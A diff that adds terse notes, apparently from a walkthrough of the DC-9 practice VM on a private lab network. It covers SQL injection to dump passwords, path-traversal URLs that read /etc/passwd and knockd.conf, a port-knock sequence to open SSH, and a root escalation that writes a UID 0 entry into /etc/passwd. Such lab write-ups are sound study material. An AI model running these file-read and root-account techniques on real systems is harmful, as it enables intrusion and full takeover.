@@ -1,0 +1,26 @@
+sqli
+  //get user list and passwds
+
+LFI
+  http://192.168.56.111/manage.php?file=../../../../etc/passwd
+
+  //as 22 port is filter, try to acess knockd.conf, get the sequence
+  http://192.168.56.111/manage.php?file=../../../../etc/knockd.conf
+    [options] UseSyslog [openSSH] sequence = 7469,8475,9842 seq_timeout = 25 command = /sbin/iptables -I INPUT -s %IP% -p tcp --dport 22 -j
+    ACCEPT tcpflags = syn [closeSSH] sequence = 9842,8475,7469 seq_timeout = 25 command = /sbin/iptables -D INPUT -s %IP% -p tcp --dport 22 -j ACCEPT tcpflags = syn 
+port knock
+  //to open the 22 port, use the sequence
+      $ knock 192.168.56.111 7469 8475 9842
+esclate privi
+  sudo -l
+    Matching Defaults entries for fredf on dc-9:
+        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+    
+    User fredf may run the following commands on dc-9:
+        (root) NOPASSWD: /opt/devstuff/dist/test/test
+  //add user with root privi to passwd
+    /openssl, facilates passwd strings
+      openssl passwd -1 -salt USERNAME PASSWD
+    /complete the whole line in the  passwd
+      "USername:passw_string:0:0::root:/bin/bash"
+    
